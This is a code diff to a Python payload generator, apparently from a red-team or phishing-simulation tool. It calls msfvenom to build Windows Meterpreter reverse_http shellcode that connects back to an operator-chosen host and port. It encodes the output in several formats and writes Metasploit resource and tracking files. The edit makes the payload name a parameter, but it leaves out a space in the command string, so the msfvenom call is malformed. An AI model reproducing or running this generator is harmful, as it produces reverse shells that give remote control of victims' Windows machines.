@@ -9,7 +9,7 @@ import random
 class Generator():
 
 
-	def genShellcode(self, host, port, arch, name, shellProcess = None):
+	def genShellcode(self, host, port, arch, name, payload, shellProcess = None):
 		#TODO fix to use string .format, remove the filewrite
 		code = ''
 		form = 'c'
@@ -25,11 +25,11 @@ class Generator():
 			form = "psh"
 
 		if (arch  == "x86"):
-			os.system("msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_http PayloadUUIDTracking=true PayloadUUIDName=" + uuid +" LHOST="+host+" LPORT="+port+" -f "+form+" > /tmp/metasploit 2> /dev/null")
+			os.system("msfvenom -a x86 --platform windows -p " + payload + "PayloadUUIDTracking=true PayloadUUIDName=" + uuid +" LHOST="+host+" LPORT="+port+" -f "+form+" > /tmp/metasploit 2> /dev/null")
 			self.genMetasploitReourceFile(host, port)
 			self.genAnalystCSVFile(name, uuid)
 		else:
-			os.system("msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_http PayloadUUIDTracking=true PayloadUUIDName=" + uuid + " LHOST="+host+" LPORT="+port+" -f "+form+" > /tmp/metasploit 2> /dev/null")
+			os.system("msfvenom -a x64 --platform windows -p " + payload + "PayloadUUIDTracking=true PayloadUUIDName=" + uuid + " LHOST="+host+" LPORT="+port+" -f "+form+" > /tmp/metasploit 2> /dev/null")
 			self.genMetasploitReourceFile(host, port)
 			self.genAnalystCSVFile(name, uuid)
 		with open("/tmp/metasploit", 'rb') as f:
@@ -53,7 +53,6 @@ class Generator():
 			shellcode = self.hexEncode(shellcode)
 		elif shellProcess == 'decEncode':
 			shellcode = self.decEncode(shellcode)
-			print(shellcode)
 		elif shellProcess == 'b64Encode':
 			shellcode = self.b64Encode(shellcode)
 		elif shellProcess == 'pshEncode':
